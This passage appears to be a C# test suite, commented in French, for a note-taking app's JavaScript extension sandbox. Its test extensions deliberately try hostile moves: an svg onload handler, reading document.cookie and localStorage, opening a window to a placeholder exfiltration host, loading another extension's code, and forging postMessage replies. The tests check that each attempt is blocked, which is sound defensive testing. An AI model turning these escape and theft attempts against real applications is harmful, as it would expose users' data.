              <form action="{{address}}/formulaire"><input type="password" name="mot"><input type="file"><input type="hidden" value="x"><button formaction="{{address}}/b" data-action="ok">Envoyer</button></form>
              <svg onload="fuite()"><text>secret du dessin</text></svg>
              <object data="{{address}}/objet">secret de l'objet</object>
              <link rel="stylesheet" href="{{address}}/style.css">
              <p class="carte faux-dialogue" style="background:url({{address}}/fond.png)" hidden>secret cache</p>
              <p>texte <b>gras</b> <unknown-tag>garde</unknown-tag></p>
            `);
            """);
        using var ui = new UiThread();

        var answer = Wait(scene.Engine.RenderViewAsync("hostile", dark: false));
        Pump(TimeSpan.FromMilliseconds(500));

        Assert.IsTrue(answer.Succeeded, answer.Error);
        var nodes = answer.Content!.Descendants().ToList();
        Assert.IsFalse(tcp.Pending(), "Rien ne se charge en lisant ce qu'elle a écrit.");
        CollectionAssert.AreEquivalent(
            new[] { "h1", "span", "form", "button", "p", "strong", ExtensionNode.TextTag },
            nodes.Select(node => node.Tag).Distinct().ToArray());
        Assert.IsFalse(answer.Content.Text.Contains("secret", StringComparison.Ordinal), answer.Content.Text);
        StringAssert.Contains(answer.Content.Text, "le texte de l'image", StringComparison.Ordinal);
        StringAssert.Contains(answer.Content.Text, "un lien", StringComparison.Ordinal);
        StringAssert.Contains(answer.Content.Text, "garde", StringComparison.Ordinal);
        Assert.IsTrue(nodes.All(node => !node.Attributes.ContainsKey("style") && !node.Attributes.ContainsKey("href") && !node.Attributes.ContainsKey("onclick") && !node.Attributes.ContainsKey("formaction") && !node.Attributes.ContainsKey("action")));
        Assert.IsTrue(nodes.Single(node => node.Tag == "span").Data.ContainsKey("externe"), "L'attribut reste une donnée, sans rien qui l'ouvre.");
        Assert.IsTrue(nodes.All(node => node.Tag != "input"), "Ni mot de passe, ni fichier, ni champ caché.");
    }

    [EngineTest]
    public void A_render_too_big_or_too_deep_is_refused_and_the_extension_goes_on()
    {
        using var scene = new Scene();
        scene.Install("enorme", """
            kyfrev.bloc("gros", () => "x".repeat(3 * 1024 * 1024));
            kyfrev.bloc("nombreux", () => "<p>x</p>".repeat(20001));
            kyfrev.bloc("profond", () => "<div>".repeat(80));
            kyfrev.vue(() => "bien");
            """);
        using var ui = new UiThread();

        foreach (var language in new[] { "gros", "nombreux", "profond" })
        {
            StringAssert.Contains(Wait(scene.Engine.RenderBlockAsync("enorme", language, string.Empty, dark: false)).Error, "trop volumineux", StringComparison.Ordinal);
        }
        Assert.AreEqual("bien", TextOf(scene, "enorme"));
    }

    [EngineTest]
    public void Restarting_makes_an_extension_forget_what_it_read()
    {
        using var scene = new Scene();
        scene.Install("memoire", """
            let vues = 0;
            kyfrev.vue(() => `vue ${++vues}`);
            """);
        using var ui = new UiThread();
        Assert.AreEqual("vue 1", TextOf(scene, "memoire"));
        Assert.AreEqual("vue 2", TextOf(scene, "memoire"));

        scene.Engine.Restart();

        Assert.AreEqual("vue 1", TextOf(scene, "memoire"));
    }

    [EngineTest]
    public void An_extension_touches_neither_the_page_nor_the_application()
    {
        using var scene = new Scene();
        scene.Install("hote", """
            const essai = (nom, faire) => { try { faire(); return `${nom}: passe`; } catch (e) { return `${nom}: bloque`; } };
            kyfrev.vue(() => [
              essai("page", () => parent.document.title),
              essai("adresse", () => top.location.href),
              essai("stockage", () => localStorage.getItem("x")),
              essai("cookie", () => document.cookie),
              essai("fenetre", () => { if (!window.open("https://fuite.invalid/")) throw new Error(); }),
              essai("alerte", () => alert("faux dialogue")),
              `canal: ${typeof window.chrome?.webview?.hostObjects}`,
            ].join(" | "));
            kyfrev.action("canal", () => {
              window.chrome?.webview?.postMessage?.({ kind: "rafraichir", id: "autre" });
              window.chrome?.webview?.postMessage?.({ kind: "resultat", id: "autre", n: 1, html: "faux" });
            });
            """);
        using var ui = new UiThread();
        var refreshed = new List<string>();
        scene.Engine.RefreshAsked += (_, e) => refreshed.Add(e.Extension);

        var html = TextOf(scene, "hote");
        Assert.IsTrue(Wait(scene.Engine.ActAsync("hote", "canal", null, new Dictionary<string, string>())).Succeeded);
        Pump(TimeSpan.FromMilliseconds(300));

        foreach (var tried in new[] { "page", "adresse", "stockage", "cookie", "fenetre" })
        {
            StringAssert.Contains(html, $"{tried}: bloque", StringComparison.Ordinal);
        }
        Assert.IsEmpty(refreshed, "Le canal de la page n'écoute pas un cadre.");
    }

    [EngineTest]
    public void An_extension_cannot_load_the_code_of_another()
    {
        using var scene = new Scene();
        scene.Publish("bilan");
        scene.Install("voleuse", """
            const charger = (adresse) => new Promise((fin) => {
              const s = document.createElement("script");
              s.src = adresse;
              s.onload = () => fin("charge");
              s.onerror = () => fin("refuse");
              document.body.append(s);
            });
            kyfrev.vue(async () => [
              await charger("https://extensions.kyfrev.invalid/bilan/extension.js"),
              await charger("https://extensions.kyfrev.invalid/hote.js"),
              await charger("/voleuse/autre.js"),
            ].join(" | "));
            """);
        File.WriteAllText(Path.Combine(scene.Library.FolderOf("voleuse"), "autre.js"), string.Empty);
        using var ui = new UiThread();

        Assert.AreEqual("refuse | refuse | charge", TextOf(scene, "voleuse"));
    }

    [EngineTest]
    public void An_extension_cannot_answer_in_the_place_of_another()
    {
        using var scene = new Scene();
        scene.Install("lente", """
            kyfrev.vue(() => new Promise((fin) => setTimeout(() => fin("la vraie reponse"), 800)));
            kyfrev.action("vite", () => {});
            """);
        scene.Install("usurpe", """
            let jeton = null;
            addEventListener("message", (e) => { jeton = e.data?.jeton ?? jeton; });
            kyfrev.vue(() => "usurpe");
            kyfrev.action("usurper", () => {
              for (let n = 1; n < 200; n++) parent.postMessage({ type: "resultat", n, html: "la fausse reponse", jeton }, "*");
              for (let i = 0; i < parent.frames.length; i++) {
                if (parent.frames[i] !== window) {
                  for (let n = 1; n < 200; n++) {
                    parent.frames[i].postMessage({ type: "reponse", n, resultat: "faux", jeton }, "*");
                    parent.frames[i].postMessage({ type: "rendre-vue", n, jeton }, "*");
                  }
                }
              }
              return new Promise((fin) => setTimeout(fin, 100));
            });
            """);
        using var ui = new UiThread();
        Wait(scene.Engine.RenderViewAsync("usurpe", dark: false));
        Wait(scene.Engine.ActAsync("lente", "vite", null, new Dictionary<string, string>()));

        var slow = scene.Engine.RenderViewAsync("lente", dark: false);
        Wait(scene.Engine.ActAsync("usurpe", "usurper", null, new Dictionary<string, string>()));

        Assert.IsFalse(slow.IsCompleted && slow.Result.Content?.Text != "la vraie reponse", "La réponse d'un autre cadre n'est pas prise.");
        Assert.AreEqual("la vraie reponse", Wait(slow).Content!.Text);
    }

    [EngineTest]
    public void A_message_without_the_token_of_the_frame_is_ignored()
    {
        using var scene = new Scene();
        scene.Install("sans-jeton", """
            kyfrev.vue(() => "vue");
            kyfrev.action("seul", () => { parent.postMessage({ type: "rafraichir" }, "*"); });
            kyfrev.action("avec", () => { kyfrev.rafraichir(); });
            """);
        using var ui = new UiThread();
        var refreshed = new List<string>();
        scene.Engine.RefreshAsked += (_, e) => refreshed.Add(e.Extension);

        Wait(scene.Engine.ActAsync("sans-jeton", "seul", null, new Dictionary<string, string>()));
        Pump(TimeSpan.FromMilliseconds(300));
        Assert.IsEmpty(refreshed);

        Wait(scene.Engine.ActAsync("sans-jeton", "avec", null, new Dictionary<string, string>()));
        UiThread.Until(() => refreshed.Count == 1, Long);
        Assert.AreEqual("sans-jeton", refreshed.Single());
    }

    [EngineTest]
    public void An_extension_that_never_answers_blocks_nothing_and_the_others_go_on()
    {
        using var scene = new Scene();
        scene.Install("bloquee", """
            kyfrev.vue(() => { for (;;) { } });
            kyfrev.action("silence", () => new Promise(() => {}));
            """);
        scene.Install("saine", """kyfrev.vue(() => "saine");""");
        using var ui = new UiThread();
        Assert.AreEqual("saine", TextOf(scene, "saine"));
        scene.Engine.Patience = TimeSpan.FromSeconds(2);

        var silent = Wait(scene.Engine.ActAsync("bloquee", "silence", null, new Dictionary<string, string>()));
        StringAssert.Contains(silent.Error, "pas de réponse", StringComparison.Ordinal);

        var stuck = Wait(scene.Engine.RenderViewAsync("bloquee", dark: false));
        StringAssert.Contains(stuck.Error, "pas de réponse", StringComparison.Ordinal);

        scene.Engine.Patience = TimeSpan.FromSeconds(30);
        Assert.AreEqual("saine", TextOf(scene, "saine"));
    }

    [EngineTest]
    public void A_bad_answer_is_told_and_the_frame_stays()
    {
        using var scene = new Scene();
        scene.Install("mauvaise", """
            kyfrev.bloc("essai", () => 12);
            kyfrev.action("casse", () => { throw new Error("elle casse"); });
            """);
        using var ui = new UiThread();

        StringAssert.Contains(Wait(scene.Engine.RenderBlockAsync("mauvaise", "essai", string.Empty, dark: false)).Error, "chaîne HTML", StringComparison.Ordinal);
        StringAssert.Contains(Wait(scene.Engine.RenderBlockAsync("mauvaise", "autre", string.Empty, dark: false)).Error, "aucun rendu", StringComparison.Ordinal);
        StringAssert.Contains(Wait(scene.Engine.RenderViewAsync("mauvaise", dark: false)).Error, "pas de vue", StringComparison.Ordinal);
        StringAssert.Contains(Wait(scene.Engine.ActAsync("mauvaise", "casse", null, new Dictionary<string, string>())).Error, "elle casse", StringComparison.Ordinal);
        StringAssert.Contains(Wait(scene.Engine.ActAsync("mauvaise", "absente", null, new Dictionary<string, string>())).Error, "inconnue", StringComparison.Ordinal);
    }

    [EngineTest]
    public void A_stopped_or_changed_extension_is_forgotten()
    {
        using var scene = new Scene();
        var source = scene.Install("change", """kyfrev.vue(() => "premiere");""");
        using var ui = new UiThread();
        Assert.AreEqual("premiere", TextOf(scene, "change"));

        File.WriteAllText(Path.Combine(source, "extension.js"), """kyfrev.vue(() => "seconde");""");
        scene.Library.Install(source);
        Assert.AreEqual("premiere", TextOf(scene, "change"), "Son cadre reste jusqu'à ce qu'on l'oublie.");
        scene.Engine.Forget("change");
        Assert.AreEqual("seconde", TextOf(scene, "change"));

        scene.Library.SetActive("change", false);
        Assert.AreEqual("extension inactive", Wait(scene.Engine.RenderViewAsync("change", dark: false)).Error);
        scene.Engine.Forget("jamais-vue");
    }

    [EngineTest]
    public void A_closed_engine_answers_nothing()
    {
        using var scene = new Scene();
        scene.Install("fermee", """kyfrev.vue(() => "vue");""");
        using var ui = new UiThread();
        var waiting = scene.Engine.RenderViewAsync("fermee", dark: false);

        scene.Engine.Dispose();

        Assert.IsFalse(Wait(waiting).Succeeded);
        Assert.AreEqual("extension inactive", Wait(scene.Engine.RenderViewAsync("fermee", dark: false)).Error);
    }

    [EngineTest]
    public void The_page_is_closed_to_everything_but_its_frames()
    {
        using var scene = new Scene();
        scene.Install("page", """kyfrev.vue(() => "vue");""");
        using var ui = new UiThread();
        Wait(scene.Engine.RenderViewAsync("page", dark: false));

        var frame = Run(scene, "document.querySelector('iframe').getAttribute('sandbox')");
        Assert.AreEqual("\"allow-scripts\"", frame);
        var read = Run(scene, "(async () => { try { await fetch('/page/extension.js'); return 'passe'; } catch (e) { return 'bloque'; } })()");
        Assert.AreEqual("{}", read, "La page elle-même ne lit rien par le réseau.");
    }

    [EngineTest]
    public void A_count_a_card_and_a_command_answer_within_their_limits()
    {
        using var scene = new Scene();
        scene.Install("mesuree", """
            let n = 0;
            kyfrev.vue(() => "vue");
            kyfrev.commande("ajouter", (contexte) => { n += contexte.combien === "beaucoup" ? 5000 : 1; });
            kyfrev.compteur(() => n);
            kyfrev.encart(() => n > 0 ? { texte: "x".repeat(400), detail: "y".repeat(400) } : { texte: "" });
            """);
        scene.Install("muette", """
            kyfrev.vue(() => "vue");
            kyfrev.compteur(() => "beaucoup");
            kyfrev.encart(() => ({ texte: "Seul", detail: 3 }));
            """);
        scene.Install("absente", """kyfrev.vue(() => "vue");""");
        using var ui = new UiThread();

        Assert.IsNull(Wait(scene.Engine.CountAsync("mesuree")));
        Assert.IsNull(Wait(scene.Engine.CardAsync("mesuree")));
        Assert.IsTrue(Wait(scene.Engine.CommandAsync("mesuree", "ajouter", new Dictionary<string, string>())).Succeeded);
        Assert.AreEqual(1, Wait(scene.Engine.CountAsync("mesuree")));
        var card = Wait(scene.Engine.CardAsync("mesuree"))!.Value;
        Assert.AreEqual((300, 300), (card.Text.Length, card.Detail!.Length));
        Wait(scene.Engine.CommandAsync("mesuree", "ajouter", new Dictionary<string, string> { ["combien"] = "beaucoup" }));
        Assert.AreEqual(999, Wait(scene.Engine.CountAsync("mesuree")));
        StringAssert.Contains(Wait(scene.Engine.CommandAsync("mesuree", "autre", new Dictionary<string, string>())).Error, "inconnue", StringComparison.Ordinal);

        Assert.IsNull(Wait(scene.Engine.CountAsync("muette")));
        Assert.AreEqual(("Seul", (string?)null), Wait(scene.Engine.CardAsync("muette")));
        Assert.IsNull(Wait(scene.Engine.CountAsync("absente")));
        Assert.IsNull(Wait(scene.Engine.CardAsync("absente")));
        Assert.IsNull(Wait(scene.Engine.CountAsync("jamais-installee")));
    }

    [EngineTest]
    public void A_guided_selection_waits_for_the_user_without_the_patience_running()
    {
        using var scene = new Scene();
        scene.InstallWith("guidee", """{"api":2,"id":"guidee","nom":"Guidée","version":"1","vue":{"titre":"G"},"permissions":["selection","fiches:lecture"]}""", """
            let recu = "rien";
            kyfrev.vue(() => recu);
            kyfrev.commande("demander", async () => {
              const r = await kyfrev.selection.demander("Sélectionnez la question", { fiche: "f_1", saisie: false });
              // Après la réponse, encore un peu de travail : il tient dans une patience entière, pas dans la fin de l'autre.
              await new Promise((fini) => setTimeout(fini, 1200));
              recu = `${r.choix}|${r.texte}|${r.fiche}|${r.titre}|${r.debut}|${r.fin}`;
            });
            kyfrev.commande("ouvrir", () => kyfrev.fiches.ouvrir("f_1", { debut: 3, fin: 9 }));
            kyfrev.commande("ouvrir-tout", () => kyfrev.fiches.ouvrir("f_2"));
            """);
        scene.InstallWith("sans", """{"api":2,"id":"sans","nom":"Sans","version":"1","vue":{"titre":"S"}}""", """
            kyfrev.vue(() => "sans");
            kyfrev.commande("demander", () => kyfrev.selection.demander("x"));
            kyfrev.commande("ouvrir", () => kyfrev.fiches.ouvrir("f_1"));
            """);
        using var ui = new UiThread();
        var user = new TaskCompletionSource();
        var screen = new FakeScreen { Answered = user.Task };

        StringAssert.Contains(Wait(scene.Engine.CommandAsync("guidee", "demander", new Dictionary<string, string>())).Error, "ne montre rien", StringComparison.Ordinal);
        scene.Engine.Screen = screen;
        scene.Engine.Patience = TimeSpan.FromSeconds(2);
        var asking = scene.Engine.CommandAsync("guidee", "demander", new Dictionary<string, string>());
        UiThread.Until(() => screen.Asks.Count == 1, Long);
        var waited = System.Diagnostics.Stopwatch.StartNew();
        UiThread.Until(() => asking.IsCompleted || waited.Elapsed > scene.Engine.Patience * 3, Long);
        Assert.IsFalse(asking.IsCompleted, "L'extension attend l'utilisateur au-delà de trois fois sa patience, sans être arrêtée.");
        user.SetResult();
        var asked = Wait(asking);
        Assert.IsTrue(asked.Succeeded, asked.Error);
        Assert.AreEqual(new SelectionAsk("Guidée", "Sélectionnez la question", "f_1", AllowsTyping: false), screen.Asks.Single());
        scene.Engine.Patience = TimeSpan.FromSeconds(30);
        Assert.AreEqual("selection|la mitose|f_1|Mitose|3|9", TextOf(scene, "guidee"));

        Assert.IsTrue(Wait(scene.Engine.CommandAsync("guidee", "ouvrir", new Dictionary<string, string>())).Succeeded);
        Assert.IsTrue(Wait(scene.Engine.CommandAsync("guidee", "ouvrir-tout", new Dictionary<string, string>())).Succeeded);
        Assert.AreEqual("f_1 3 9 | f_2 - -", string.Join(" | ", screen.Opened));

        screen.Refusal = "aucune fiche ouverte";
        StringAssert.Contains(Wait(scene.Engine.CommandAsync("guidee", "demander", new Dictionary<string, string>())).Error, "aucune fiche ouverte", StringComparison.Ordinal);
        screen.Refusal = null;
        screen.Problem = "fiche introuvable";
        StringAssert.Contains(Wait(scene.Engine.CommandAsync("guidee", "ouvrir", new Dictionary<string, string>())).Error, "fiche introuvable", StringComparison.Ordinal);

        StringAssert.Contains(Wait(scene.Engine.CommandAsync("sans", "demander", new Dictionary<string, string>())).Error, "« selection » non demandée", StringComparison.Ordinal);
        StringAssert.Contains(Wait(scene.Engine.CommandAsync("sans", "ouvrir", new Dictionary<string, string>())).Error, "« fiches:lecture » non demandée", StringComparison.Ordinal);
        scene.Library.Library.SetGranted("guidee", ExtensionRight.Selection, false);
        StringAssert.Contains(Wait(scene.Engine.CommandAsync("guidee", "demander", new Dictionary<string, string>())).Error, "retirée dans les Paramètres", StringComparison.Ordinal);
        Assert.HasCount(2, screen.Asks, "Une permission retirée n'arrive pas jusqu'à l'écran.");
        scene.Library.SetActive("guidee", false);
        StringAssert.Contains(Wait(scene.Engine.CommandAsync("guidee", "demander", new Dictionary<string, string>())).Error, "inactive", StringComparison.Ordinal);
    }

    [TestMethod]
    public void The_engine_needs_its_folder_its_library_and_its_requests()
    {
        var library = new ExtensionLibrary("x", TimeProvider.System);
        var requests = new ExtensionRequests(library, new FakeData());
        Assert.ThrowsExactly<ArgumentException>(() => new ExtensionEngine(string.Empty, library, requests));
        Assert.ThrowsExactly<ArgumentNullException>(() => new ExtensionEngine("x", null!, requests));
        Assert.ThrowsExactly<ArgumentNullException>(() => new ExtensionEngine("x", library, null!));
    }

    private static string TextOf(Scene scene, string id)
    {
        var answer = Wait(scene.Engine.RenderViewAsync(id, dark: false));
        Assert.IsTrue(answer.Succeeded, answer.Error);
        return answer.Content!.Text;
    }

    private static T Wait<T>(Task<T> task)
    {
        UiThread.Until(() => task.IsCompleted, Long);
        return task.Result;
    }

    private static ExtensionAnswer Wait(Task<ExtensionAnswer> answer)
    {
        UiThread.Until(() => answer.IsCompleted, Long);
        return answer.Result;
    }

    private static string Run(Scene scene, string script)
    {
        var run = scene.Engine.RunScriptAsync(script);
        UiThread.Until(() => run.IsCompleted, Long);
        return run.Result;
    }

    private static void Pump(TimeSpan duration)
    {
        var end = DateTime.UtcNow + duration;
        UiThread.Until(() => DateTime.UtcNow >= end, duration + Long);
    }

    /// <summary>Une bibliothèque et un moteur d'essai.</summary>
    private sealed class Scene : IDisposable
    {
        private readonly string _root = Path.Combine(Path.GetTempPath(), "kyfrev-extensions-" + Guid.NewGuid().ToString("N"));

        public Scene()
        {
            Directory.CreateDirectory(_root);
            Library = new TestLibrary(Path.Combine(_root, "bibliotheque"));
            Engine = new ExtensionEngine(FakeEnvironment.ExtensionData, Library.Library, new ExtensionRequests(Library.Library, Data));
        }

        public TestLibrary Library { get; }

        public FakeData Data { get; } = new();

        public ExtensionEngine Engine { get; }

        /// <summary>Installe une extension publiée, telle quelle.</summary>
        public void Publish(string id) => Assert.IsTrue(Library.Library.Install(Path.Combine(Published, id)).Succeeded);

        /// <summary>Installe une extension d'essai avec son manifeste.</summary>
        public void InstallWith(string id, string manifest, string script)
        {
            var source = Path.Combine(_root, "sources", id);
            Directory.CreateDirectory(source);
            File.WriteAllText(Path.Combine(source, ExtensionManifest.FileName), manifest);
            File.WriteAllText(Path.Combine(source, "extension.js"), script);
            var installed = Library.Library.Install(source);
            Assert.IsTrue(installed.Succeeded, installed.Error);
        }

        /// <summary>Installe une extension d'essai, avec toutes les permissions si elle lit les fiches, et rend son dossier source.</summary>
        public string Install(string id, string script)
        {
            var source = Path.Combine(_root, "sources", id);
            Directory.CreateDirectory(source);
            File.WriteAllText(Path.Combine(source, ExtensionManifest.FileName), JsonSerializer.Serialize(new { id, nom = id, version = "1", vue = new { titre = id } }));
            File.WriteAllText(Path.Combine(source, "extension.js"), script);
            var installed = Library.Library.Install(source);
            Assert.IsTrue(installed.Succeeded, installed.Error);
            return source;
        }

        public void Dispose()
        {
            Engine.Dispose();
            Directory.Delete(_root, recursive: true);
        }
    }

    private sealed class TestLibrary(string folder)
    {
        public ExtensionLibrary Library { get; } = new(folder, TimeProvider.System);

        public string FolderOf(string id) => Path.Combine(folder, id);

        public Outcome<Done> SetActive(string id, bool active) => Library.SetActive(id, active);

        public Outcome<InstalledExtension> Install(string source) => Library.Install(source);
    }

    /// <summary>Un écran d'essai : il répond à la place de l'utilisateur, quand celui-ci a « répondu ».</summary>
    private sealed class FakeScreen : IExtensionScreen
    {
        public Task Answered { get; set; } = Task.CompletedTask;

        public string? Refusal { get; set; }

        public string? Problem { get; set; }

        public List<SelectionAsk> Asks { get; } = [];

        public List<string> Opened { get; } = [];

        /// <summary>Les réponses de l'utilisateur, dans l'ordre ; ensuite, toujours la même sélection.</summary>
        public Queue<GuidedSelection> Answers { get; } = new();

        public async Task<(GuidedSelection? Answer, string? Refusal)> AskSelectionAsync(SelectionAsk ask)
        {
            Asks.Add(ask);
            await Answered.ConfigureAwait(true);
            return Refusal is { } refusal ? (null, refusal)
                : Answers.Count > 0 ? (Answers.Dequeue(), null)
                : (new GuidedSelection(GuidedSelection.Taken, "la mitose", "f_1", "Mitose", 3, 9), null);
        }

        public string? OpenSheet(string sheetId, int? passageStart, int? passageEnd)
        {
            Opened.Add($"{sheetId} {passageStart?.ToString(System.Globalization.CultureInfo.InvariantCulture) ?? "-"} {passageEnd?.ToString(System.Globalization.CultureInfo.InvariantCulture) ?? "-"}");
            return Problem;
        }
    }

    /// <summary>Le coffre tel que les extensions le voient : une fiche, dont le texte change à la demande.</summary>
    private sealed class FakeData : IExtensionData
    {
        public string Text { get; set; } = string.Empty;

        public string? Stored { get; private set; }

        public int Calls { get; private set; }

        public Task<Outcome<IReadOnlyList<ExtensionSheet>>> SheetsAsync()
        {
            Calls++;
            return Task.FromResult(Outcome.Of<IReadOnlyList<ExtensionSheet>>([new ExtensionSheet("f_1", "Une fiche", "Histoire", [], false)]));
        }

        public Task<Outcome<ExtensionSheetText>> SheetAsync(string id)
        {
            Calls++;
            return Task.FromResult(Outcome.Of(new ExtensionSheetText(id, "Une fiche", Text)));
        }

        public Task<Outcome<string?>> StoredAsync(string extension)
        {
            Calls++;
            return Task.FromResult(Outcome.Of(Stored));
        }

        public Task<Outcome<Done>> StoreAsync(string extension, string json)
        {
            Calls++;
            Stored = json;
            return Task.FromResult(Outcome.Done());
        }

        /// <summary>Ce qu'une version précédente de l'extension a laissé dans le coffre.</summary>
        public void Keep(string json) => Stored = json;
        public List<string> Writes { get; } = [];

        public Task<Outcome<string>> CreateSheetAsync(string extension, ExtensionNewSheet sheet)
        {
            Calls++;
            Writes.Add($"creer {sheet.Title} {sheet.Folder} {sheet.Text} {string.Join(",", sheet.Tags)}");
            return Task.FromResult(Outcome.Of("f_2"));
        }

        public Task<Outcome<IReadOnlyList<string>>> SetTagsAsync(string extension, string id, IReadOnlyList<string> tags)
        {
            Calls++;
            Writes.Add($"etiqueter {id} {string.Join(",", tags)}");
            return Task.FromResult(Outcome.Of(tags));
        }

        public Task<Outcome<Done>> WriteSheetAsync(string extension, string id, string text)
        {
            Calls++;
            Writes.Add($"ecrire {id} {text}");
            return Task.FromResult(Outcome.Done());
        }

        public Task<Outcome<IReadOnlyList<ExtensionJournalEntry>>> JournalAsync(string extension) =>
            Task.FromResult(Outcome.Of<IReadOnlyList<ExtensionJournalEntry>>([]));
    }
}
